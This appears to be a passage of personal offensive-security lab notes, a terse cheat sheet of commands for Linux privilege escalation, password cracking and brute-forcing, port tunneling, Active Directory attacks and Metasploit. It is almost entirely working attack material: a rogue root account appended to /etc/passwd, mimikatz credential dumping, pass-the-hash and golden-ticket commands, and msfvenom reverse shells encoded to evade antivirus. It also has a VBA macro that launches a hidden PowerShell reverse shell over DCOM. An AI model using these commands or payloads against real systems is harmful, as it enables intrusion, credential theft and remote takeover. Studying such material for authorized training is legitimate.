RESEARCH USBCAP FOR MORE (THERE ARE SEVERAL VULNERABILITIES)

LINUX CRON JOBS
student@debian:~$ grep "CRON" /var/log/cron.log

LINUX INSECURE FILE PERMISSIONS
ADD TO /ETC/PASSWD
student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd

LINUX KERNEL
n00b@victim:~$ cat /etc/issue
n00b@victim:~$ uname -r
n00b@victim:~$ arch
kali@kali:~$ searchsploit linux kernel ubuntu 16.04
n00b@victim:~$ gcc 43418.c -o exploit
```

<hr>

# PASSWORD ATTACKS

```
SCRAPE WEBSITES FOR WORDS
kali@kali:~$ cewl www.url.com -m 6 -w savefile.txt

JOHN THE RIPPER
kali@kali:~$ sudo nano /etc/john/john.conf
kali@kali:~$ john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt

CRUNCH (GENERATE LISTS)
kali@kali:~$ crunch 8 8 -t ,@@^^%%%
kali@kali:~$ crunch 4 6 0123456789ABCDEF -o crunch.txt
kali@kali:~$ wc -l crunch.txt
17891328 crunch.txt
kali@kali:~$ crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt

MEDUSA (LOGIN BRUTE FORCER)
kali@kali:~$ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin

CROWBAR (FOR RDP, USES SSH KEYS INSTEAD OF PASSWORDS)
kali@kali:~$ sudo apt install crowbar
kali@kali:~$ crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/passwordfile.txt -n 1

HYDRA (OR THC-HYDRA, BRUTE FORCE LOGINS)
kali@kali:~$ hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
kali@kali:~$ hydra http-form-post -U
Syntax: <url>:<form parameters>:<condition string>[:<optional>[:
<optional>]
kali@kali:~$ hydra 10.11.0.22 http-form-post
    "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P
    /usr/share/wordlists/rockyou.txt -vV -f

ANALYZE HASHES
kali@kali:~$ hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
kali@kali:~$ hashid
    '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKAF
    3G0tHD9bd59e5NAz/s7DQcAojRTWNpZX0'
[+] SHA-512 Crypt

kali@kali:~$ sudo grep root /etc/shadow
root:$6$Rw99zZ2B$AZwfboPWM6z2tiBeK.EL74sivucCa8YhCrXGCBoVdeYUGsf8iwNxJkr.w
TLDjI5poygaUcLaWtP/gewQkO7jT/:17564:0:99999:7:::

C:\> C:\Tools\password_attacks\mimikatz.exe
mimikatz # lsadump::sam
    Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e

PASS THE HASH (PTH)
kali@kali:~$ pth-winexe -U, --user=[DOMAIN/]USERNAME[%PASSWORD] Set the network username
kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd

HASH CRACKING

JTR BRUTE FORCE
kali@kali:~$ sudo john hash.txt --format=NT
JTR WORDLIST
kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT

LINUX - COMBINE PASSWD & SHADOW
kali@kali:~$ unshadow passwd-file.txt shadow-file.txt
kali@kali:~$ unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
kali@kali:~$ john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

HASHCAT BASELINE
C:\Users\Cracker\hashcat-4.2.1> hashcat64.exe -b
```

<hr>

# PORT REDIRECTION AND TUNNELING

```
RINETD WITH HTTP
kali@kali:~$ ping google.com -c 1
kali@kali:~$ root@kali:~# nc -nvv 216.58.207.142 80
kali@kali:~# ssh student@10.11.0.128
student@debian:~$ nc -nvv 216.58.207.142 80
(UNKNOWN) [216.58.207.142] 80 (http) : No route to host
kali@kali:~$ sudo apt update && sudo apt install rinetd
kali@kali:~$ cat /etc/rinetd.conf
kali@kali:~$ sudo service rinetd restart
student@debian:~$ nc -nvv 10.11.0.4 80
(UNKNOWN) [10.11.0.4] 80 (http) open

SSH LOCAL PORT FORWARDING
CLEAR AND SET IPTABLES FOR SSH
root@debian:~# /root/port_forwarding_and_tunneling/ssh_local_port_forwarding.sh
#!/bin/bash
# Clear iptables rules
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -F
iptables -X
# SSH Scenario
iptables -F
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 3389 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 8080 -m state --state NEW -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT

ssh -N -L [bind_address:]port:host:hostport [username@address]
kali@kali:~$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445
kali@kali:~$ sudo nano /etc/samba/smb.conf
    min protocol = SMB2 (IMPORTANT)
kali@kali:~$ sudo /etc/init.d/smbd restart
kali@kali:~# smbclient -L 127.0.0.1 -U Administrator

SSH REMOTE PORT FORWARDING
CLEAR AND SET IPTABLES FOR SSH 
root@debian:~# /root/port_forwarding_and_tunneling/ssh_remote_port_forwarding.sh
ssh -N -R [bind_address:]port:host:hostport [username@address]
student@debian:~$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
kali@kali:~$ ss -antp | grep "2221"
kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221

SSH DYNAMIC PORT FORWARDING (PROXY)
root@debian:~# /root/port_forwarding_and_tunneling/ssh_remote_port_forwarding.sh
ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
kali@kali:~$ cat /etc/proxychains.conf
    [ProxyList]
    # add proxy here ...    
    # meanwile
    # defaults set to "tor"
    socks4 127.0.0.1 8080
kali@kali:~$ sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110

PLINK (WINDOWS BASED SSH - NEED ADMIN)
kali@kali:~$ sudo nc -lnvp 443
C:\Windows\system32>
C:\Windows\system32>netstat -anpb TCP
THIS WILL ASK FOR A PROMPT... SO USE THE SECOND ONE
C:\Tools\port_redirection_and_tunneling> plink.exe -ssh -l kali -pw ilak 
    -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
NO PROMPT TO VERIFY HOST
C:\Tools\port_redirection_and_tunneling> cmd.exe /c echo y | plink.exe 
    -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 1234

NETSH
C:\Windows\system32> netsh interface portproxy add v4tov4 listenport=4455
    listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
C:\Windows\system32> netstat -anp TCP | find "4455"
C:\Windows\system32> netsh advfirewall firewall add rule
    name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22
    localport=4455 action=allow
kali@kali:~$ nano /etc/samba/smb.conf
    min protocol = SMB2 (REQUIRED)
kali@kali:~$ sudo /etc/init.d/smbd restart
kali@kali:~$ sudo mkdir /mnt/win10_share
kali@kali:~$ sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o
    username=Administrator,password=Qwerty09! /mnt/win10_share

HTTP TUNNELING THROUGH DEEP PACKET INSPECTION (FIREWALL ONLY ALLOWS HTTP)
CLEAR AND SET IPTABLES FOR TUNNELING
root@debian:~# cat /root/port_forwarding_and_tunneling/http_tunneling.sh
#!/bin/bash
# Clear iptables rules
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -F
iptables -X
# SSH Scenario
iptables -F
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 1234 -m state --state NEW -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
root@debian:~# /root/port_forwarding_and_tunneling/http_tunneling.sh
kali@kali:~$ sudo apt install httptunnel
www-data@debian:/$ ssh -L 0.0.0.0:8888:192.168.1.110:3389
student@debian:~$ ss -antp | grep "8888"
student@debian:~$ hts --forward-port localhost:8888 1234
student@debian:~$ ps aux | grep hts
student@debian:~$ ss -antp | grep "1234"
NOW CONNECT TO AN RDP SESSION ON WINDOWS
```

<hr>

# ACTIVE DIRECTORY ATTACKS

```
C:\Users\Offsec.corp> net user
User accounts for \\CLIENT251

C:\Users\Offsec.corp> net user /domain
The request will be processed at a domain controller for domain corp.com.
User accounts for \\DC01.corp.com

C:\Users\Offsec.corp> net user jeff_admin /domain
Global Group memberships *Domain Users *Domain Admins (MAKE A NOTE)

C:\Users\Offsec.corp> net group /domain

MODERN APPROACH WITH LDAP
LDAP://HostName[:PortNumber][/DistinguishedName]

PS C:\Users\offsec.CORP>
    [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

SCRIPT TO STORE VARIABLES
$domainObj =
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object
System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
    {
        $prop
    }
Write-Host "------------------------"
}
$Searcher.FindAll()

CHANGE FILTER LINE FOR DIFFERENT RESULTS
$Searcher.filter="name=Jeff_Admin"
$Searcher.filter="(objectClass=Group)"
$Searcher.filter="(name=Secret_Group)"
$Searcher.filter="(name=Nested_Group)"
$Searcher.filter="(name=Another_Nested_Group)"

FIND LOGGED IN USERS
PS C:\Tools\active_directory> Import-Module .\PowerView.ps1
PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName client251
PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01

SERVICE PRINCIPLE NAMES USING THE ABOVE SCRIPT
CHANGE THE SCRIPT
$Searcher.filter="serviceprincipalname=*http*"
Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
    {
        $prop
    }
}

PS C:\Users\offsec.CORP> nslookup CorpWebServer.corp.com

FINDING CREDENTIALS USING MIMIKATZ
C:\Tools\active_directory> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets

SERVICE ACCOUNTS ATTACKS - KLIST OR MIMIKATZ OR KERBEROAST
ADD A SERVICE TO USE
Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -
    ArgumentList 'HTTP/CorpWebServer.corp.com'
PS C:\Users\offsec.CORP> klist
mimikatz # kerberos::list /export
kali@kali:~$ sudo apt update && sudo apt install kerberoast
kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-
    40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi

PASSWORD GUESSING (WATCH OUT FOR LOCKING ACCOUNTS)
PS C:\Users\Offsec.corp> net accounts
    Lockout threshold: 5 (THIS SHOWS THE AMOUNT OF ATTEMPTS ALLOWED)
ADD TO THE PREVIOUS SCRIPT
New-Object System.DirectoryServices.DirectoryEntry
    ($SearchString, "jeff_admin", "Qwerty09!")
CORRECT ENTRY = distinguishedName : {DC=corp,DC=com}
INCORRECT ENTRY = format-default : The following exception occurred

SPRAY PASSWORDS
PS C:\Tools\active_directory> .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin

PASS THE HASH (PTH, ONLY GOOD FOR NTLM AND NOT KERBEROS)
kali@kali:~$ pth-winexe -U
    Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05
    c425e //10.11.0.22 cmd

OVERPASS THE HASH
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com
    /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe

LIST CACHED KERBEROS TICKETS
PS C:\Windows\system32> klist
PS C:\Windows\system32> net use \\dc01
PS C:\Windows\system32> klist

USE PSEXEC WITH THAT KERBEROS TICKET
PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe

PASS THE TICKET
EXAMPLE SID = S-1-5-21-2536614405-3629634762-1218571035-1116
mimikatz # kerberos::purge
mimikatz # kerberos::list
mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-
    1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com
    /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
mimikatz # kerberos::list

DISTRIBUTED COMPONENT OBJECT MODEL (DCOM)
THIS IS IN THE FORM OF A SCRIPT
$com =
[activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application",
"192.168.1.110"))
$com | Get-Member

MACROS - CREATE A PAYLOAD WITH MSVENOM - STICK IT IN THE MACRO
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111
    LPORT=4444 -f hta-psh -o evil.hta  
USE PYTHON TO BREAK UP THE STRINGS
    str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
    n = 50
    for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"' 
CREATE YOUR MACRO
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
    Shell (Str)
End Sub
EXAMPLE MACRO IN SIMPLE FORM TO RUN NOTEPAD
Sub mymacro()
    Shell ("notepad.exe")
End Sub

DCOM RUN MACRO VIA VBA (SAVE THE FILE TO THE OLD .XLS, NOT .XLSX)
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
    [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
THIS WILL GIVE AN ERROR BECAUSE IT'S NOT RUNNING AS SYSTEM... FIX IT HERE
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls") [SUCCEEDS]

CALL THE RUN METHOD
$com =
    [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application",
    "192.168.1.110"))
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
    [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")

PS C:\Tools\practical_tools> nc.exe -lvnp 4444

GOLDEN TICKET
TEST LATERAL MOVEMENT
LAUNCH A PROMPT
C:\Tools\active_directory> psexec.exe \\dc01 cmd.exe
Access is denied.
ON THE DC
mimikatz # privilege::debug
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-
    1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
mimikatz # misc::cmd
LAUNCH NEW PROMPT
C:\Users\offsec.crop> psexec.exe \\dc01 cmd.exe
SUCCESS

DC SYNCRONIZATION
mimikatz # lsadump::dcsync /user:Administrator
Hash NTLM: e2b475c11da2a0748290d87aa966c327
ntlm- 0: e2b475c11da2a0748290d87aa966c327
lm - 0: 913b84377b5cb6d210ca519826e7b5f5
```

<hr>

# METASPLOIT

```
INSTALL UPDATE AND RUN
kali@kali:~$ sudo systemctl start postgresql
kali@kali:~$ sudo systemctl enable postgresql
kali@kali:~$ sudo msfdb init
kali@kali:~$ sudo apt update; sudo apt install metasploit-framework
kali@kali:~$ sudo msfconsole -q

USE SOMETHING
msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > back
msf5 auxiliary(scanner/portscan/syn) > previous
msf5 auxiliary(scanner/portscan/tcp) > show options

VIEW RESULTS OF SCANS
msf5 auxiliary(scanner/portscan/tcp) > services

NMAP IN MSF
msf5 > db_nmap
msf5 > db_nmap 10.11.0.22 -A -Pn
msf5 > hosts
msf5 > services -p 445

WORKSPACES
msf5 > workspace

AUXILIARY MODULES
msf5 > show auxiliary
msf5 > search type:auxiliary name:smb
msf5 > use scanner/smb/smb2
msf5 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
msf5 auxiliary(scanner/smb/smb2) > run

ADD TO OPTIONS AFTER SEARCH OF A TARGET
msf5 auxiliary(scanner/smb/smb_login) > set SMBDomain corp.com
msf5 auxiliary(scanner/smb/smb_login) > set SMBUser Offsec
msf5 auxiliary(scanner/smb/smb_login) > set SMBPass ABCDEFG123!
msf5 auxiliary(scanner/smb/smb_login) > setg RHOSTS 10.11.0.22
msf5 auxiliary(scanner/smb/smb_login) > set THREADS 10
msf5 auxiliary(scanner/smb/smb_login) > run

INFO AFTER SUCCESSFUL LOGIN
msf5 > creds

TEST MULTIPLE USERS
msf5 auxiliary(scanner/smb/smb_login) > set USERPASS_FILE /home/kali/users.txt
msf5 auxiliary(scanner/smb/smb_login) > run

SCAN FOR RDP
msf5 auxiliary(scanner/smb/smb_login) > use scanner/rdp/rdp_scanner
msf5 auxiliary(scanner/rdp/rdp_scanner) > run

FIND EXPLOITS
msf5 > search syncbreeze

STAGED
windows/shell_reverse_tcp
UNSTAGED
windows/shell/reverse_tcp

ENUMERATION
meterpreter > sysinfo
meterpreter > getuid

UPLOADS AND DOWNLOADS
meterpreter > upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec
meterpreter > download c:\\Windows\\system32\\calc.exe /tmp/calc.exe

SPAWN A SHELL
meterpreter > shell
    C:\Windows\system32>

MSVENOM
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4
    LPORT=443 -f exe -o shell_reverse.exe
OR MSVENOM DONE TO AVOID ANTI-VIRUS
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4
    LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
    Payload size: 567 bytes
    Final size of exe file: 73802 bytes
    Saved as: shell_reverse_msf_encoded.exe
```






















